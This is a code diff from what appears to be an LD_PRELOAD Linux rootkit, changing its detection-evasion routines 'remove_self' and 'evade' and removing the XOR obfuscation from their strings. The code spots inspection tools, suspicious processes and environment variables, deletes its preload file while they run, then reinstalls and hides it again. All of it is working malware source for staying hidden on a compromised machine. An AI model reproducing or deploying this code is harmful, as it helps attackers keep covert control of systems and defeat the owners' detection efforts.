@@ -1,48 +1,53 @@
-int move_self(void)
-{
+int remove_self(void){
     if(not_user(0)) return VINVALID_PERM;
 
     /* rm our preload file so that new processes henceforth
        are clean processes. */
     hook(CUNLINK);
-    xor(ldpreload, LDSO_PRELOAD);
-    (void)call(CUNLINK, ldpreload);
-    clean(ldpreload);
+    call(CUNLINK, LDSO_PRELOAD);
 
     pid_t pid;
     if((pid = fork()) == -1) return VFORK_ERR;   /* if we can't fork, return error */
     else if(pid == 0) return VFORK_SUC;          /* return VFORK_SUC in the child */
 
     /* continue in the parent process */
-    (void)wait(NULL);
+    wait(NULL);
     reinstall();                /* rewrite our preload file */
-    xhide_path(LDSO_PRELOAD);   /* and hide it */
+    hide_path(LDSO_PRELOAD);   /* and hide it */
     return VEVADE_DONE;
 }
 
-int evade(const char *filename, char *const argv[], char *const envp[])
-{
+int evade(const char *filename, char *const argv[], char *const envp[]){
     char path[PATH_MAX];
 
+    /* check scary_procs array */
     for(int i = 0; i < SCARY_PROCS_SIZE; i++){
-        xor(current_scary_proc, scary_procs[i]);
-        (void)snprintf(path, sizeof(path) - 1, "*/%s", current_scary_proc);
-        clean(current_scary_proc);
+        snprintf(path, sizeof(path), "*/%s", scary_procs[i]);
 
-        if(xprocess(scary_procs[i]) || xstrstr(scary_procs[i], filename) ||
-            !fnmatch(path, filename, FNM_PATHNAME)) return move_self();
+        /* if calling process is a scary process, or calling process
+           is launching a scary process */
+        if(process(scary_procs[i]) || strstr(scary_procs[i], filename) ||
+            !fnmatch(path, filename, FNM_PATHNAME))
+            return remove_self();  /* uninstall then reinstall after process execution */
     }
 
+    /* check scary_paths array.
+       see if somebody is trying to call the dynamic linker
+       in order to resolve a path's dependencies. */
     for(int i = 0; i < SCARY_PATHS_SIZE; i++)
-        if(!xfnmatch(scary_paths[i], filename) ||
-            xstrstr(scary_paths[i], filename))
+        if(!fnmatch(scary_paths[i], filename, FNM_PATHNAME) ||
+            strstr(scary_paths[i], filename))
             for(int ii = 0; argv[ii] != NULL; ii++)
-                if(!strcmp(argv[ii], "--list")) return move_self();
+                if(!strncmp(LIST_FLAG, argv[ii], strlen(LIST_FLAG)))
+                    return remove_self();
 
+    /* check scary_variables array to see if there is anything
+       set that is a potential detection threat and subvert it. */
     if(envp != NULL)
         for(int i = 0; envp[i] != NULL; i++)
             for(int ii = 0; ii < SCARY_VARIABLES_SIZE; ii++)
-                if(!xstrncmp(scary_variables[ii], envp[i])) return move_self();
+                if(!strncmp(scary_variables[ii], envp[i], strlen(envp[i])))
+                    return remove_self();
 
     return VNOTHING_DONE;
 }
